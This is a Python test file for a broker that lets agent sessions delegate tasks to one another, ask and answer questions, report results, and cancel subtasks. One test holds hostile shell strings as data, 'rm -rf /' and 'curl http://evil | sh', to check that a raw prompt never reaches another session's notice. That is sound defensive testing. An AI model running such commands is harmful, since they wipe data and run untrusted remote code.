from __future__ import annotations

import json
import uuid
from collections.abc import Iterator
from typing import Any

import pytest

from duplex_broker import tasks
from duplex_broker.ids import reply_id
from duplex_broker.store import (
    BROKER_BINDING_ID,
    Actor,
    Binding,
    Conflict,
    Forbidden,
    Invalid,
    ModeUnsupported,
    Store,
)

OWNER = Actor.user("owner")
FULL = ["auto", "queue", "steer", "restart"]


class Clock:
    """Each reading is a millisecond later, so rows created in order sort in order."""

    def __init__(self) -> None:
        self.t = 1_000_000.0

    def __call__(self) -> float:
        self.t += 0.001
        return self.t


@pytest.fixture
def store() -> Iterator[Store]:
    s = Store(":memory:", now=Clock())
    yield s
    s.close()


def bind(store: Store, title: str, provider: str = "claude") -> Binding:
    binding, _ = store.register_binding(
        provider,  # type: ignore[arg-type]
        uuid.uuid4().hex,
        title,
        "w",
        "e",
        {"receive_messages": "verified", "send_modes": FULL, "tasks": True},
    )
    return binding


def turn(store: Store, binding: Binding, state: str, waiting_for: str | None) -> None:
    """A reading with the next sequence number for that binding, as its adapter would send it."""
    tasks.report_turn(store, binding, state, waiting_for, store.get_binding(binding.id).turn_seq + 1)


def messages(store: Store, conversation_id: str) -> list[dict[str, Any]]:
    """The broker notices in a conversation, oldest first: kind, text, recipients and client id."""
    out = []
    with store._read() as db:
        for row in db.execute(
            "SELECT m.id, m.text, m.recipients, m.client_message_id, m.mode, e.payload FROM messages m"
            " JOIN events e ON e.message_id = m.id AND e.type = 'message.accepted'"
            " WHERE m.conversation_id = ? ORDER BY m.rowid",
            (conversation_id,),
        ):
            notice = json.loads(row["payload"]).get("notice", {})
            out.append(
                {
                    "id": row["id"],
                    "kind": notice.get("kind"),
                    "notice": notice,
                    "text": row["text"],
                    "to": json.loads(row["recipients"]),
                    "client": row["client_message_id"],
                    "mode": row["mode"],
                }
            )
    return out


def kinds(store: Store, conversation_id: str) -> list[str]:
    return [m["kind"] for m in messages(store, conversation_id)]


def delivery_of(store: Store, message_id: str) -> tuple[str, str | None]:
    with store._read() as db:
        row = db.execute(
            "SELECT state, reason FROM deliveries WHERE message_id = ?", (message_id,)
        ).fetchone()
    return row["state"], row["reason"]


def delegate(
    store: Store, requester: Binding, assignee: Binding, text: str = "build it", **kw: Any
) -> dict[str, Any]:
    return tasks.create_task(
        store, requester, assignee.id, text, kw.pop("done_when", "it builds"), kw.pop("parent", None), "auto"
    )


def raw_id(task: dict[str, Any]) -> str:
    return str(task["id"]).replace("-", "")


# Creating


def test_a_task_gets_its_conversation_and_an_assigned_notice(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker", "codex")
    text = "write the parser for the new log format and test it " * 3
    task = delegate(store, boss, worker, text)
    assert task["status"] == "working" and task["outcome"] is None and task["result"] is None
    assert task["requester"] == {"id": boss.id, "title": "boss"}
    assert task["assignee"] == {"id": worker.id, "title": "worker"}
    conversation_id = task["conversation_id"].replace("-", "")
    conversation = store.get_conversation(OWNER, conversation_id)
    assert conversation.kind == "group" and conversation.mode == "user_directed"
    assert conversation.owner == "owner"
    assert conversation.title == "Task: " + text[:60]
    assert {m.id for m in store.members(OWNER, conversation_id)} == {"owner", boss.id, worker.id}
    (assigned,) = messages(store, conversation_id)
    assert assigned["client"] == f"task:{raw_id(task)}:assigned"
    assert assigned["to"] == [worker.id] and assigned["mode"] == "auto"
    assert assigned["notice"] == {"kind": "task_assigned", "task_id": raw_id(task)}
    for part in ("boss", "write the parser", "Done when: it builds", "bridge_task_report"):
        assert part in assigned["text"]
    assert "bridge_task_ask" in assigned["text"] and task["id"] in assigned["text"]
    claimed = store.claim_next(worker.id, worker.lease_generation)
    assert claimed is not None and claimed[1].id == assigned["id"]
    assert claimed[1].actor == Actor.binding(BROKER_BINDING_ID)


def test_the_assignee_is_named_by_id_or_exact_title_and_must_be_another_active_session(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    twin_a, twin_b = bind(store, "twin"), bind(store, "twin")
    by_title = tasks.create_task(store, boss, "worker", "t", "d", None, "auto")
    assert by_title["assignee"]["id"] == worker.id
    by_displayed_id = tasks.create_task(store, boss, reply_id(worker.id), "t", "d", None, "auto")
    assert by_displayed_id["assignee"]["id"] == worker.id
    for bad in ("nobody", "twin", "boss", "Worker"):
        with pytest.raises(Invalid):
            tasks.create_task(store, boss, bad, "t", "d", None, "auto")
    assert tasks.create_task(store, boss, twin_a.id, "t", "d", None, "auto")["assignee"]["id"] == twin_a.id
    store.retire_binding(OWNER, twin_b.id)
    assert tasks.create_task(store, boss, "twin", "t", "d", None, "auto")["assignee"]["id"] == twin_a.id
    mock = bind(store, "mocked", "mock")
    with pytest.raises(Invalid):
        tasks.create_task(store, boss, mock.id, "t", "d", None, "auto")
    with pytest.raises(Forbidden):
        tasks.create_task(store, mock, worker.id, "t", "d", None, "auto")


def test_a_child_names_its_parent_and_only_the_parents_assignee_creates_it(store: Store) -> None:
    a, b, c = bind(store, "a"), bind(store, "b"), bind(store, "c")
    parent = delegate(store, a, b)
    child = delegate(store, b, c, "sub", parent=parent["id"])
    assert child["parent_task_id"] == parent["id"]
    assert [x["id"] for x in tasks.get_task(store, b, parent["id"])["children"]] == [child["id"]]
    with pytest.raises(Forbidden):
        delegate(store, a, c, "sneaky", parent=parent["id"])
    tasks.report(store, c, child["id"], "done", "ok")
    tasks.report(store, b, parent["id"], "done", "ok")
    with pytest.raises(Conflict):
        delegate(store, b, c, "late", parent=parent["id"])


def test_a_mode_the_assignee_cannot_take_refuses_the_task_and_creates_nothing(store: Store) -> None:
    boss = bind(store, "boss")
    plain, _ = store.register_binding("claude", "n", "plain", "w", "e", {"tasks": True})
    with store._read() as db:
        before = [
            db.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
            for t in ("tasks", "conversations", "messages")
        ]
    with pytest.raises(ModeUnsupported):
        tasks.create_task(store, boss, plain.id, "t", "d", None, "steer")
    with store._read() as db:
        after = [
            db.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
            for t in ("tasks", "conversations", "messages")
        ]
    assert after == before
    queued = tasks.create_task(store, boss, plain.id, "t", "d", None, "auto")
    assert queued["status"] == "working"


def test_a_queue_mode_assignment_waits_for_a_busy_assignee(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    store.set_turn_state(worker.id, "busy", None)
    task = tasks.create_task(store, boss, worker.id, "t", "d", None, "queue")
    assert messages(store, task["conversation_id"].replace("-", ""))[0]["mode"] == "queue"
    assert store.claim_next(worker.id, worker.lease_generation) is None
    store.set_turn_state(worker.id, "idle", None)
    assert store.claim_next(worker.id, worker.lease_generation) is not None


# Reporting and reading


def test_a_report_ends_the_task_and_the_result_notice_goes_to_the_requester_once(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    task = delegate(store, boss, worker)
    done = tasks.report(store, worker, task["id"], "done", "all green")
    assert (done["status"], done["outcome"], done["result"]) == ("result_available", "done", "all green")
    assert done["ended_at"] is not None and done["delivered_at"] is None
    conversation_id = task["conversation_id"].replace("-", "")
    assert kinds(store, conversation_id) == ["task_assigned", "task_result"]
    result = messages(store, conversation_id)[1]
    assert result["to"] == [boss.id] and result["client"] == f"task:{raw_id(task)}:result"
    assert result["notice"] == {"kind": "task_result", "task_id": raw_id(task)}
    assert "all green" not in result["text"] and "bridge_task_status" in result["text"]
    with pytest.raises(Conflict):
        tasks.report(store, worker, task["id"], "done", "again")
    assert kinds(store, conversation_id) == ["task_assigned", "task_result"]


def test_a_failed_report_ends_failed_and_only_the_assignee_reports(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    task = delegate(store, boss, worker)
    with pytest.raises(Forbidden):
        tasks.report(store, boss, task["id"], "done", "mine")
    failed = tasks.report(store, worker, task["id"], "failed", "the disk is full")
    assert (failed["status"], failed["outcome"]) == ("failed", "failed")


def test_the_requesters_first_read_of_the_result_is_its_delivery(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    task = delegate(store, boss, worker)
    tasks.report(store, worker, task["id"], "done", "r")
    assert tasks.get_task(store, worker, task["id"])["delivered_at"] is None
    first = tasks.get_task(store, boss, task["id"])
    assert first["result"] == "r" and first["delivered_at"] is not None
    assert tasks.get_task(store, boss, task["id"])["delivered_at"] == first["delivered_at"]
    stranger = bind(store, "stranger")
    with pytest.raises(Forbidden):
        tasks.get_task(store, stranger, task["id"])


def test_the_requesters_list_keeps_a_finished_task_until_its_result_is_read(store: Store) -> None:
    boss, worker = bind(store, "boss"), bind(store, "worker")
    waiting, finished = delegate(store, boss, worker, "one"), delegate(store, boss, worker, "two")
    tasks.report(store, worker, finished["id"], "done", "r")
    assert [t["id"] for t in tasks.list_tasks(store, boss, "requester", True)] == [
        waiting["id"],
        finished["id"],
    ]
    assert [t["id"] for t in tasks.list_tasks(store, worker, "requester", True)] == []
    assert [t["id"] for t in tasks.list_tasks(store, worker, "assignee", True)] == [
        waiting["id"],
        finished["id"],
    ]
    tasks.get_task(store, boss, finished["id"])
    assert [t["id"] for t in tasks.list_tasks(store, boss, "both", True)] == [waiting["id"]]
    assert [t["id"] for t in tasks.list_tasks(store, boss, "both", False)] == [waiting["id"], finished["id"]]


# Children and held results


def family(store: Store) -> tuple[Binding, Binding, Binding, Binding, dict[str, Any]]:
    a, b, c, d = (bind(store, n) for n in "abcd")
    return a, b, c, d, delegate(store, a, b, "parent")


def result_notices(store: Store, task: dict[str, Any]) -> list[dict[str, Any]]:
    return [
        m for m in messages(store, task["conversation_id"].replace("-", "")) if m["kind"] == "task_result"
    ]


def test_a_result_reported_over_live_children_is_released_only_when_the_last_child_ends(store: Store) -> None:
    a, b, c, d, parent = family(store)
    first = delegate(store, b, c, "one", parent=parent["id"])
    second = delegate(store, b, d, "two", parent=parent["id"])
    held = tasks.report(store, b, parent["id"], "done", "parent result")
    assert held["status"] == "waiting_for_children" and held["result"] is None and held["ended_at"] is None
    assert result_notices(store, parent) == []
    tasks.report(store, c, first["id"], "done", "one done")
    assert tasks.get_task(store, b, parent["id"])["status"] == "waiting_for_children"
    assert result_notices(store, parent) == []
    tasks.report(store, d, second["id"], "failed", "two failed")
    released = tasks.get_task(store, a, parent["id"])
    assert (released["status"], released["outcome"], released["result"]) == (
        "result_available",
        "done",
        "parent result",
    )
    assert len(result_notices(store, parent)) == 1
    with pytest.raises(Conflict):
        tasks.report(store, b, parent["id"], "done", "twice")


def test_a_held_result_is_released_when_the_last_child_is_cancelled_instead(store: Store) -> None:
    a, b, c, d, parent = family(store)
    first = delegate(store, b, c, "one", parent=parent["id"])
    second = delegate(store, b, d, "two", parent=parent["id"])
    tasks.report(store, b, parent["id"], "failed", "gave up")
    tasks.cancel(store, Actor.binding(b.id), first["id"], None)
    assert result_notices(store, parent) == []
    tasks.cancel(store, Actor.binding(b.id), second["id"], "no longer needed")
    released = tasks.get_task(store, a, parent["id"])
    assert (released["status"], released["result"]) == ("failed", "gave up")
    assert len(result_notices(store, parent)) == 1


def test_a_report_with_no_live_child_is_not_held_even_if_children_ended(store: Store) -> None:
    _a, b, c, _d, parent = family(store)
    child = delegate(store, b, c, "one", parent=parent["id"])
    tasks.report(store, c, child["id"], "done", "r")
    assert tasks.report(store, b, parent["id"], "done", "now")["status"] == "result_available"
    assert len(result_notices(store, parent)) == 1


def test_a_held_result_releases_up_a_chain_of_waiting_parents(store: Store) -> None:
    a, b, c, d, top = family(store)
    middle = delegate(store, b, c, "middle", parent=top["id"])
    leaf = delegate(store, c, d, "leaf", parent=middle["id"])
    tasks.report(store, b, top["id"], "done", "top result")
    tasks.report(store, c, middle["id"], "done", "middle result")
    assert result_notices(store, top) == [] and result_notices(store, middle) == []
    tasks.report(store, d, leaf["id"], "done", "leaf result")
    assert tasks.get_task(store, a, top["id"])["result"] == "top result"
    assert tasks.get_task(store, b, middle["id"])["result"] == "middle result"


# Cancelling


def test_cancel_reaches_grandchildren_and_each_assignee_is_told(store: Store) -> None:
    a, b, c, d = (bind(store, n) for n in "abcd")
    top = delegate(store, a, b, "top")
    child = delegate(store, b, c, "child", parent=top["id"])
    grandchild = delegate(store, c, d, "grandchild", parent=child["id"])
    sibling = delegate(store, a, d, "unrelated")
    tasks.report(store, b, top["id"], "done", "top held")
    cancelled = tasks.cancel(store, Actor.binding(a.id), top["id"], "plans changed")
    assert cancelled["status"] == "cancelled" and cancelled["ended_at"] is not None
    for task, assignee in ((top, b), (child, c), (grandchild, d)):
        view = tasks.owner_task(store, task["id"])
        assert view["status"] == "cancelled"
        conversation_id = task["conversation_id"].replace("-", "")
        notice = messages(store, conversation_id)[-1]
        assert notice["kind"] == "task_cancelled" and notice["to"] == [assignee.id]
        assert notice["client"] == f"task:{raw_id(task)}:cancelled"
    assert "plans changed" in messages(store, top["conversation_id"].replace("-", ""))[-1]["text"]
    assert tasks.owner_task(store, sibling["id"])["status"] == "working"
    assert tasks.owner_task(store, top["id"])["result"] is None


def test_cancel_cancels_the_assignees_queued_notices_and_withdraws_open_questions(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    conversation_id = task["conversation_id"].replace("-", "")
    assigned_id = messages(store, conversation_id)[0]["id"]
    tasks.ask(store, b, task["id"], "which branch?")
    asked_id = messages(store, conversation_id)[1]["id"]
    tasks.cancel(store, Actor.user("owner"), task["id"], None)
    assert delivery_of(store, assigned_id) == ("cancelled", "task cancelled")
    assert delivery_of(store, asked_id) == ("cancelled", "question withdrawn")
    assert tasks.owner_task(store, task["id"])["questions"] == []
    assert tasks.owner_task(store, task["id"])["status"] == "cancelled"
    notice = messages(store, conversation_id)[-1]
    assert notice["kind"] == "task_cancelled" and "owner" in notice["text"]
    assert notice["text"].endswith("Stop work on it and report nothing.")
    assert delivery_of(store, notice["id"]) == ("queued", None)


def test_cancel_is_the_requesters_and_an_ended_task_cannot_be_cancelled(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    with pytest.raises(Forbidden):
        tasks.cancel(store, Actor.binding(b.id), task["id"], None)
    tasks.report(store, b, task["id"], "done", "r")
    with pytest.raises(Conflict):
        tasks.cancel(store, Actor.binding(a.id), task["id"], None)
    other = delegate(store, a, b)
    tasks.cancel(store, Actor.binding(a.id), other["id"], None)
    with pytest.raises(Conflict):
        tasks.cancel(store, Actor.user("owner"), other["id"], None)


# Questions


def test_a_question_goes_to_the_requester_and_its_answer_to_the_assignee(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    conversation_id = task["conversation_id"].replace("-", "")
    asked = tasks.ask(store, b, task["id"], "which branch?")
    assert (asked["kind"], asked["state"], asked["text"]) == ("asked", "open", "which branch?")
    notice = messages(store, conversation_id)[1]
    assert notice["to"] == [a.id] and notice["kind"] == "task_question"
    assert notice["notice"] == {
        "kind": "task_question",
        "task_id": raw_id(task),
        "question_id": asked["id"].replace("-", ""),
    }
    assert notice["client"] == f"task:{raw_id(task)}:question:{asked['id'].replace('-', '')}"
    assert "which branch?" in notice["text"] and "bridge_task_answer" in notice["text"]
    assert [q["id"] for q in tasks.get_task(store, a, task["id"])["questions"]] == [asked["id"]]
    with pytest.raises(Forbidden):
        tasks.answer(store, b, asked["id"], "self")
    answered = tasks.answer(store, a, asked["id"], "main")
    assert (answered["state"], answered["answer"]) == ("answered", "main")
    reply = messages(store, conversation_id)[2]
    assert reply["to"] == [b.id] and reply["kind"] == "task_answer" and "main" in reply["text"]
    with pytest.raises(Conflict):
        tasks.answer(store, a, asked["id"], "again")
    with pytest.raises(Conflict):
        tasks.withdraw(store, b, asked["id"])
    assert tasks.get_task(store, a, task["id"])["questions"] == []


def test_the_assignee_withdraws_a_question_and_only_it_can(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    asked = tasks.ask(store, b, task["id"], "q?")
    with pytest.raises(Forbidden):
        tasks.withdraw(store, a, asked["id"])
    assert tasks.withdraw(store, b, asked["id"])["state"] == "withdrawn"
    with pytest.raises(Conflict):
        tasks.answer(store, a, asked["id"], "too late")
    with pytest.raises(Forbidden):
        tasks.ask(store, a, task["id"], "not mine")
    tasks.report(store, b, task["id"], "done", "r")
    with pytest.raises(Conflict):
        tasks.ask(store, b, task["id"], "after the end")


def test_a_questions_queued_notice_is_cancelled_when_it_is_answered_or_withdrawn(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    conversation_id = task["conversation_id"].replace("-", "")
    answered = tasks.ask(store, b, task["id"], "one?")
    withdrawn = tasks.ask(store, b, task["id"], "two?")
    handed = tasks.ask(store, b, task["id"], "three?")
    one, two, three = (messages(store, conversation_id)[i]["id"] for i in (1, 2, 3))
    assert delivery_of(store, one) == ("queued", None)
    # The first delivery to a is handed over and still in flight when the question closes.
    claimed = store.claim_next(a.id, a.lease_generation)
    assert claimed is not None and claimed[1].id == one
    tasks.answer(store, a, answered["id"], "yes")
    assert delivery_of(store, one) == ("dispatching", None)
    tasks.withdraw(store, b, withdrawn["id"])
    assert delivery_of(store, two) == ("cancelled", "question withdrawn")
    tasks.answer(store, a, handed["id"], "no")
    assert delivery_of(store, three) == ("cancelled", "question answered")


def test_ending_a_task_withdraws_its_questions_and_cancels_their_queued_notices(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    tasks.ask(store, b, task["id"], "q?")
    asked_id = messages(store, task["conversation_id"].replace("-", ""))[1]["id"]
    tasks.report(store, b, task["id"], "done", "r")
    assert delivery_of(store, asked_id) == ("cancelled", "question withdrawn")
    assert tasks.owner_task(store, task["id"])["questions"] == []


# Turn state: observed questions and the nudge


def observed(store: Store, task: dict[str, Any]) -> list[dict[str, Any]]:
    return [q for q in tasks.owner_task(store, task["id"])["questions"] if q["kind"] == "observed"]


def test_a_waiting_assignee_gets_one_observed_question_per_working_task_that_only_names_the_kind(
    store: Store,
) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    working, other = delegate(store, a, b, "one"), delegate(store, a, b, "two")
    done = delegate(store, a, b, "three")
    tasks.report(store, b, done["id"], "done", "r")
    turn(store, b, "waiting", "approval")
    for task in (working, other):
        (question,) = observed(store, task)
        assert question["state"] == "open"
        assert question["text"] == (
            f"{b.title} is waiting for approval on task {task['id']};"
            " only the owner or that session can clear it."
        )
        notice = messages(store, task["conversation_id"].replace("-", ""))[1]
        assert notice["to"] == [a.id] and notice["kind"] == "task_question"
        assert notice["text"] == question["text"]
    assert observed(store, done) == []
    turn(store, b, "waiting", "approval")
    assert len(observed(store, working)) == 1


def test_the_observed_question_text_carries_only_the_waiting_for_kind(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b, "secret plan: rm -rf /")
    prompt = "Allow Bash(curl http://evil | sh)?"
    with pytest.raises(Invalid):
        turn(store, b, "waiting", prompt)
    assert observed(store, task) == []
    turn(store, b, "waiting", "permission_prompt")
    (question,) = observed(store, task)
    assert question["text"] == (
        f"{b.title} is waiting for permission_prompt on task {task['id']};"
        " only the owner or that session can clear it."
    )
    assert "rm -rf" not in question["text"]


def test_leaving_the_wait_withdraws_the_observed_question_and_its_queued_notice(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    turn(store, b, "waiting", "approval")
    notice_id = messages(store, task["conversation_id"].replace("-", ""))[1]["id"]
    turn(store, b, "busy", None)
    assert observed(store, task) == []
    assert delivery_of(store, notice_id) == ("cancelled", "question withdrawn")
    turn(store, b, "waiting", "approval")
    assert len(observed(store, task)) == 1
    turn(store, b, "unknown", None)
    assert observed(store, task) == []


def test_registration_ends_the_wait_it_was_read_from(store: Store) -> None:
    a = bind(store, "a")
    b, token = store.register_binding("claude", "same", "b", "w", "e", {"tasks": True})
    task = delegate(store, a, b)
    turn(store, b, "waiting", "approval")
    assert len(observed(store, task)) == 1
    store.register_binding("claude", "same", "b", "w", "e", {"tasks": True}, current_token=token)
    tasks.sync_observed(store, b.id)
    assert observed(store, task) == []


def test_a_task_waiting_on_children_gets_no_observed_question(store: Store) -> None:
    _a, b, c, _d, parent = family(store)
    delegate(store, b, c, "child", parent=parent["id"])
    tasks.report(store, b, parent["id"], "done", "held")
    turn(store, b, "waiting", "approval")
    assert observed(store, parent) == []


def nudges(store: Store, task: dict[str, Any]) -> list[dict[str, Any]]:
    return [m for m in messages(store, task["conversation_id"].replace("-", "")) if m["kind"] == "task_nudge"]


def test_an_idle_assignee_with_an_unreported_task_is_nudged_once_per_task(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    turn(store, b, "busy", None)
    assert nudges(store, task) == []
    turn(store, b, "idle", None)
    (nudge,) = nudges(store, task)
    assert nudge["to"] == [b.id] and nudge["client"] == f"task:{raw_id(task)}:nudge"
    assert nudge["text"] == (
        f"Task {task['id']} is open: report a result with bridge_task_report, or ask with bridge_task_ask."
    )
    turn(store, b, "busy", None)
    turn(store, b, "idle", None)
    turn(store, b, "idle", None)
    assert len(nudges(store, task)) == 1
    other = delegate(store, a, b, "another")
    turn(store, b, "idle", None)
    assert len(nudges(store, task)) == 1 and len(nudges(store, other)) == 1


def test_no_nudge_for_a_reported_task_one_with_live_children_or_another_sessions_task(store: Store) -> None:
    a, b, c, d, parent = family(store)
    reported = delegate(store, a, c, "reported")
    tasks.report(store, c, reported["id"], "done", "r")
    turn(store, c, "idle", None)
    assert nudges(store, reported) == []
    child = delegate(store, b, d, "child", parent=parent["id"])
    turn(store, b, "idle", None)
    assert nudges(store, parent) == []
    turn(store, d, "idle", None)
    assert len(nudges(store, child)) == 1
    tasks.report(store, d, child["id"], "done", "r")
    turn(store, b, "idle", None)
    assert len(nudges(store, parent)) == 1


# The owner's view


def test_the_owner_sees_every_task_with_its_events(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    tasks.ask(store, b, task["id"], "q?")
    tasks.report(store, b, task["id"], "done", "r")
    view = tasks.owner_task(store, task["id"])
    assert view["id"] == raw_id(task) and view["status"] == "result_available"
    assert [e["type"] for e in view["events"]] == ["created", "question", "reported", "withdrawn", "ended"]
    assert [t["id"] for t in tasks.owner_tasks(store, True)] == [raw_id(task)]
    tasks.get_task(store, a, task["id"])
    assert tasks.owner_tasks(store, True) == []
    assert [t["id"] for t in tasks.owner_tasks(store, False)] == [raw_id(task)]


def test_a_retired_session_hears_no_notice_and_the_task_still_ends(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    store.retire_binding(OWNER, a.id)
    ended = tasks.report(store, b, task["id"], "done", "r")
    assert ended["status"] == "result_available"
    assert kinds(store, task["conversation_id"].replace("-", "")) == ["task_assigned"]


def test_cancel_leaves_the_owners_own_queued_message_alone(store: Store) -> None:
    a, b = bind(store, "a"), bind(store, "b")
    task = delegate(store, a, b)
    conversation_id = task["conversation_id"].replace("-", "")
    own = store.post_message(OWNER, conversation_id, uuid.uuid4().hex, "one more thing", [b.id])
    tasks.cancel(store, Actor.binding(a.id), task["id"], None)
    assert delivery_of(store, own.message.id) == ("queued", None)
    assert delivery_of(store, messages(store, conversation_id)[0]["id"]) == ("cancelled", "task cancelled")
